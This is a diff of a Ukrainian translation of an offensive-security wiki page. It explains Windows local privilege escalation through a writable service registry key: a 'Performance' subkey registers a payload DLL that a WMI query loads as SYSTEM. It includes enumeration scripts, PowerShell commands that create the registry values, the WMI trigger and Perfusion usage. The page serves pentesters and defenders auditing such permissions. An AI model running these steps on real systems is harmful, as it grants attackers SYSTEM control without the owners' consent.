@@ -1,20 +1,20 @@
-# AppendData/AddSubdirectory Permission over Service Registry
+# Дозвіл AppendData/AddSubdirectory для реєстру служби
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Оригінальний пост**: [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+**Оригінальний допис:** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>
 
-## Summary
+## Підсумок
 
-Якщо у вас є лише **`Create Subkey`** / **`AppendData/AddSubdirectory`** на registry key сервісу, це все одно хороший шлях до privesc. Зазвичай ви **не можете** напряму перезаписати `ImagePath`, `ServiceDll` або інші існуючі значення, але все ще можете створити дочірній ключ **`Performance`** під:
+Якщо у вас є лише **`Create Subkey`** / **`AppendData/AddSubdirectory`** для ключа реєстру служби, це все одно може бути хорошим напрямком для privesc. Зазвичай ви **не можете** безпосередньо перезаписати `ImagePath`, `ServiceDll` або інші наявні значення, але все ще можете створити дочірній ключ **`Performance`** у:
 
 - **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
 - **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
-- Будь-яким іншим ключем **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, де ваш token має **`KEY_CREATE_SUB_KEY`**
+- Будь-якому іншому ключі **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, де ваш token має **`KEY_CREATE_SUB_KEY`**
 
-Фокус у тому, що Windows досі підтримує застарілу модель реєстрації **PerfLib V1**. Якщо у сервісу є підключ **`Performance`**, Windows може завантажити звідти DLL, коли споживач performance counter запитує дані.
+Суть у тому, що Windows досі підтримує застарілу модель реєстрації **PerfLib V1**. Якщо служба має підрозділ **`Performance`**, Windows може завантажити DLL звідти, коли consumer лічильників продуктивності запитує дані.
 
-Згідно з документацією Microsoft, мінімальна реєстрація така:
+Згідно з документацією Microsoft, мінімальна реєстрація має такий вигляд:<sup>[[1]](#references)</sup>
 ```text
 HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
 Library = C:\Path\payload.dll
@@ -22,29 +22,29 @@ Open    = OpenPerfData
 Collect = CollectPerfData
 Close   = ClosePerfData
 ```
-Отже, практичний висновок такий: **не відкидайте знайдену службу в registry лише тому, що ви отримали `CreateSubKey`, а не `SetValue`**.
+Отже, висновок для offensive security такий: **не відкидайте знахідку в реєстрі service лише тому, що ви отримали лише `CreateSubKey`, а не `SetValue`**.<sup>[[3]](#references)</sup>
 
-## Чому цього достатньо для code execution
+## Чому цього достатньо для виконання коду
 
-Підключ `Performance` зазвичай **не існує** за замовчуванням у цих services, тож вам потрібен саме примітив **`KEY_CREATE_SUB_KEY`**. Коли key створено і він містить `Library`/`Open`/`Collect`/`Close`, будь-який **performance counter consumer** може спровокувати завантаження DLL.
+Subkey `Performance` **зазвичай не існує за замовчуванням у цих services**, тому **`KEY_CREATE_SUB_KEY`** — це саме той primitive, який вам потрібен. Щойно key існує та містить `Library`/`Open`/`Collect`/`Close`, будь-який **consumer лічильника продуктивності** може ініціювати завантаження DLL.<sup>[[3]](#references)</sup>
 
 Кілька важливих деталей:
 
 - Значення **`Library`** може вказувати на **повний шлях до DLL**.
-- DLL повинна експортувати **`OpenPerfData`**, **`CollectPerfData`** і **`ClosePerfData`** та повертати `ERROR_SUCCESS`.
-- Код виконується в **context споживача**, **не обов’язково в самому вразливому service process**.
-- У класичному випадку **`RpcEptMapper`** / **`Dnscache`**, **WMI performance query** може змусити **`wmiprvse.exe`** завантажити DLL як **`NT AUTHORITY\SYSTEM`**.
+- DLL має експортувати **`OpenPerfData`**, **`CollectPerfData`** і **`ClosePerfData`** та повертати `ERROR_SUCCESS`.
+- Код виконується в **контексті consumer**, **не обов'язково безпосередньо в самому процесі вразливого service**.
+- У класичному випадку `RpcEptMapper` / `Dnscache` **WMI-запит до лічильників продуктивності** може змусити **`wmiprvse.exe`** завантажити DLL від імені **`NT AUTHORITY\SYSTEM`**.
 
-Саме тому цей primitive легко пропустити під час triage: parent service key не є "fully writable", але його все одно можна використати як weaponizable.
+Саме тому цей primitive легко пропустити під час triage: батьківський key service не є «повністю доступним для запису», але його все одно можна weaponize.
 
-## Швидка enumeration
+## Швидке перерахування
 
 Ручна перевірка за допомогою **AccessChk**:
 ```bash
 accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
 accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
 ```
-Приклад PowerShell для пошуку низькопривілейованих principals з **`CreateSubKey`** на service keys:
+Приклад PowerShell для пошуку суб'єктів із низькими привілеями, які мають **`CreateSubKey`** для ключів служб:
 ```powershell
 Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
 $weak = (Get-Acl $_.PSPath).Access | Where-Object {
@@ -59,13 +59,13 @@ if ($weak) {
 ```
 Корисні інструменти:
 
-- **PrivescCheck**: `Get-ModifiableRegistryPath` був створений спеціально, щоб виявляти цей клас проблем.
+- **PrivescCheck**: `Get-ModifiableRegistryPath` було створено спеціально для виявлення цього класу проблем.<sup>[[3]](#references)</sup>
 - **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
-- **Perfusion**: автоматизує DLL drop, реєстрацію `Performance`, WMI trigger, token duplication і cleanup на legacy вразливих цілях (наприклад: `Perfusion.exe -c cmd -i -k Dnscache`).
+- **Perfusion**: автоматизує DLL drop, реєстрацію `Performance`, WMI trigger, token duplication і очищення на застарілих вразливих цілях (наприклад: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>
 
-## Abuse flow
+## Сценарій експлуатації
 
-Створіть підключ `Performance` і заповніть необхідні значення:
+Створіть підрозділ `Performance` і заповніть необхідні значення:<sup>[[3]](#references)</sup>
 ```powershell
 $svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
 $k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
@@ -75,32 +75,35 @@ New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force
 New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
 New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
 ```
-Потім запустіть **privileged** consumer продуктивності. Класичний приклад — WMI-запит до класів `Win32_Perf*`:
+Потім ініціюйте **привілейований** споживач продуктивності. Класичним прикладом є WMI query над класами `Win32_Perf*`:<sup>[[3]](#references)</sup>
 ```powershell
 powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
 ```
-Operational notes:
+Операційні примітки:
 
-- Запуск **`perfmon.exe`** корисний, щоб перевірити, що реєстрація лічильника коректна, але зазвичай це лише завантажує DLL у **власному user context**.
-- Для реального LPE запускайте **privileged** consumer, такий як **WMI**.
-- Якщо ви пишете власний exploit, прямий запуск `cmd.exe` ізсередини DLL зазвичай залишає вас із shell у **session 0**. `Perfusion` вирішує це шляхом дублювання privileged token у процес, який був створений suspended у session атакера.
-- Узгоджуйте архітектуру DLL із цільовим consumer (**x64 на x64 системах**).
+- Запуск **`perfmon.exe`** корисний для перевірки правильності реєстрації лічильника, але зазвичай це лише завантажує DLL у **вашому власному контексті користувача**.
+- Для фактичного LPE викличте **привілейований** споживач, наприклад **WMI**.
+- Якщо ви пишете власний exploit, безпосередній запуск `cmd.exe` з DLL зазвичай залишає вас у shell у **session 0**. `Perfusion` вирішує це, дублюючи привілейований token у процес, створений у призупиненому стані в session атакувальника.<sup>[[4]](#references)</sup>
+- Узгодьте архітектуру DLL із цільовим споживачем (**x64 у системах x64**).
 
-## Version notes / recent developments
+## Примітки щодо версій / останні розробки
 
-Історично вбудованими weak keys були:
+Історично вбудованими слабкими ключами були:<sup>[[4]](#references)</sup>
 
 - **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` і `Dnscache`
 - **Windows 8 / Windows Server 2012**: `RpcEptMapper`
 
-`Perfusion` зазначає, що оновлення **April 2021** прибрали простий шлях exploitation на оновлених **Windows 8 / Windows Server 2012**, тоді як **Windows 7 / Windows Server 2008 R2** залишалися exploitable через **`Dnscache`**.
+`Perfusion` зазначає, що оновлення **квітня 2021 року** усунули простий шлях exploitation в оновлених **Windows 8 / Windows Server 2012**, тоді як **Windows 7 / Windows Server 2008 R2** залишалися вразливими через **`Dnscache`**.<sup>[[4]](#references)</sup>
 
-Ця primitive — **не лише historical**. У **January 2025**, Microsoft виправила пов’язану проблему AD DS, де члени **`Network Configuration Operators`** могли створювати subkeys під **`Dnscache`** і **`NetBT`**, а ту саму ідею **Performance-counter DLL registration** можна було повторно використати, щоб отримати **SYSTEM** на підтримуваних системах.
+Ця primitive **не є лише історичною**. У **січні 2025 року** Microsoft виправила пов’язану проблему AD DS, через яку члени **`Network Configuration Operators`** могли створювати subkeys у **`Dnscache`** і **`NetBT`**, а ту саму ідею реєстрації **Performance-counter DLL** можна було повторно використати для отримання **SYSTEM** у підтримуваних системах.<sup>[[2]](#references)</sup>
 
-Отже, сучасний урок загальний: щоразу, коли low-privileged principal має **`CreateSubKey`** на **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, перевіряйте, чи достатньо дочірнього ключа **`Performance`** перед тим, як відкидати finding.
+Отже, сучасний висновок є загальним: якщо low-privileged principal має **`CreateSubKey`** на **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, перевірте, чи достатньо дочірнього ключа **`Performance`**, перш ніж відкидати це finding.
 
 ## References
 
-- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
-- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
+- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
+- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
+- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)
+
 {{#include ../../banners/hacktricks-training.md}}
